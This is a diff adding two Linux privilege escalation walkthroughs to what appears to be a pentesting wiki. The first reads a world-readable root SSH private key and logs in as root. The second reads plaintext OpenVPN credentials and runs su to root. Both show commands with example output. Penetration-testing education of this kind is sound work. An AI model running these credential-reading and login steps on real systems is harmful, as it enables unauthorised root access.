@@ -1880,6 +1880,61 @@ Specifies whether root can log in using ssh, default is `no`. Possible values:
 
 ### AuthorizedKeysFile
 
+#### ssh privet key
+
+SSH keys can be used instead of passwords to authenticate users using SSH. These keys come in pairs: one private key and one public key. It is crucial to keep the private key secret; if a user stores their private key insecurely, anyone who can read the key may be able to log into their account using it.  
+  
+**Privilege Escalation Steps:**  
+  
+1. **Check for Hidden Directory:**  
+- A hidden directory (.ssh) exists in the system root directory. To view the contents of this directory, use the following command:  
+
+```
+     $ ls -l /.ssh     
+```
+- Example Output:  
+```
+     total 4     -rw-r--r-- 1 root root 1679 Aug 19 06:56 root_key     
+```
+
+- Note: The file `root_key` is world-readable.  
+  
+2. **View the Contents of the Private Key:**  
+- To view the contents of the `root_key` file, execute:  
+
+```
+     $ cat /.ssh/root_key     
+```
+
+- Example Output:  
+
+```
+     -----BEGIN RSA PRIVATE KEY-----     MIIEpAIBAAKCAQEA3IIf6Wczcdm38MZ9+QADSYq9FfKfwj0mJaUteyJHWHZ3/GNm ...     
+```
+  
+3. **Copy the Private Key and Set Permissions:**  
+- Copy the `root_key` file to your local machine and correct its permissions so that SSH will accept it:  
+
+```
+     $ chmod 600 root_key     
+```
+
+4. **Connect to the SSH Server as Root User:**  
+- Use the key to connect to the SSH server as the root user with the following command:  
+
+```
+     $ ssh -i root_key root@192.168.1.25     
+```
+
+- Successful connection will show:  
+
+```
+     root@debian:~# id     uid=0(root) gid=0(root) groups=0(root)     
+```
+
+***
+
+
 Specifies files that contain the public keys that can be used for user authentication. It can contain tokens like `%h`, which will be replaced by the home directory. **You can indicate absolute paths** (starting in `/`) or **relative paths from the user's home**. For example:
 
 ```bash
@@ -2230,6 +2285,33 @@ In order to **read logs the group** [**adm**](interesting-groups-linux-pe/#adm-g
 
 You should also check for files containing the word "**password**" in its **name** or inside the **content**, and also check for IPs and emails inside logs, or hashes regexps.\
 I'm not going to list here how to do all of this but if you are interested you can check the last checks that [**linpeas**](https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite/blob/master/linPEAS/linpeas.sh) perform.
+### Config Files
+Many services and programs utilize configuration (config) files to store settings, including authentication credentials. If these config files are accessible and contain reused passwords from privileged users, it may be possible to log in as that user.  
+  
+**Steps for Privilege Escalation:**  
+  
+1. **List User's Home Directory:**  
+- Command: `$ ls`  
+- Example Output: `myvpn.ovpn`  
+  
+2. **View Config File Contents:**  
+- Command: `$ cat myvpn.ovpn`  
+- Notable Entry: `auth-user-pass /etc/openvpn/auth.txt`  
+- The `auth-user-pass` option in OpenVPN allows for plaintext storage of credentials in the specified file.  
+  
+3. **Access Credentials File:**  
+- Command: `$ cat /etc/openvpn/auth.txt`  
+- Example Output:  
+
+```
+     root     password123     
+```
+
+4. **Switch to Root User:**  
+- Command: `$ su root`  
+- Password: `password123`  
+- Successful command will show: `root@debian:/home/user# id`  
+- Output: `uid=0(root) gid=0(root) groups=0(root)`
 
 ## Writable files
 
@@ -2289,9 +2371,7 @@ On the other hand, `/etc/init` is associated with **Upstart**, a newer **service
 
 ### NFS Privilege escalation
 
-{% content-ref url="nfs-no_root_squash-misconfiguration-pe.md" %}
-[nfs-no\_root\_squash-misconfiguration-pe.md](nfs-no\_root\_squash-misconfiguration-pe.md)
-{% endcontent-ref %}
+[[nfs-no_root_squash-misconfiguration-pe| nfs no_root_squash misconfiguration]]
 
 ### Escaping from restricted Shells
 
